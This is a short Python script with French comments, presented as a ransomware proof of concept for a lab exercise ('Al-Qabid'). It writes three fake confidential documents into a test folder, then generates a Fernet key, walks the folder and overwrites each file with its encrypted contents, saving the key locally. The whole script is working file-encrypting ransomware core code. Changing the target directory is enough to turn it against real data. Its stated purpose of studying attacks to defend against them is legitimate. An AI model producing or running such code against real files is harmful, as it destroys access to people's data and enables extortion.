#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Ransomware Encrypt

"""
Dossier: Ware - Étape 04: Ransomware (PoC Cryptographique)
Intention: Al-Qabid (Comprendre les restrictions pour s'en prémunir)
Description: Génère des fichiers de test et applique un chiffrement
             symétrique fort (Fernet/AES-128).
"""

import os
from cryptography.fernet import Fernet

VAULT_DIR = "./vault_documents"
KEY_FILE = "secret.key"


def create_target_documents():
    """Génère de faux fichiers sensibles à chiffrer dans notre zone de test."""
    os.makedirs(VAULT_DIR, exist_ok=True)
    documents = {
        "contrat_recherche.docx": (
            "Contenu Critique : Algorithmes IA Avancés 2026. "
            "Propriété exclusive."
        ),
        "compta_entreprise.xlsx": (
            "Chiffre d'affaires Q1 2026 : 450,000 EUR. "
            "Clés d'accès banque incluses."
        ),
        "rapport_strategique.pdf": (
            "Plan de transition infrastructure cloud sécurisée "
            "pour Ubuntu Server."
        ),
    }

    for name, content in documents.items():
        with open(os.path.join(VAULT_DIR, name), "w", encoding="utf-8") as f:
            f.write(content)
    print("[*] Fichiers de laboratoire créés dans le dossier 'vault_documents'.")


def execute_encryption():
    """Génère une clé et chiffre l'ensemble des fichiers cibles."""
    print("=" * 60)
    print(" [!] Initialisation du PoC Ransomware - Phase [Al-Qabid] ")
    print("=" * 60)

    # Étape 1 : Génération de la clé cryptographique
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)

    fernet = Fernet(key)

    # Étape 2 : Parcours et chiffrement des fichiers
    for root, dirs, files in os.walk(VAULT_DIR):
        for file in files:
            file_path = os.path.join(root, file)

            # Lecture du fichier original
            with open(file_path, "rb") as f:
                original_data = f.read()

            # Chiffrement de la donnée
            encrypted_data = fernet.encrypt(original_data)

            # Remplacement par la version chiffrée
            with open(file_path, "wb") as f:
                f.write(encrypted_data)

            print(f"[🔒 CHIFFREMENT] Fichier verrouillé : {file_path}")

    print("\n" + "=" * 60)
    print(" [✅] Opération Al-Qabid terminée. ")
    print(
        " Tente d'ouvrir tes documents ou d'utiliser "
        "'cat vault_documents/*'"
    )
    print(" La clé secrète est sauvegardée localement dans 'secret.key'")
    print("=" * 60)


if __name__ == "__main__":
    create_target_documents()
    execute_encryption()
    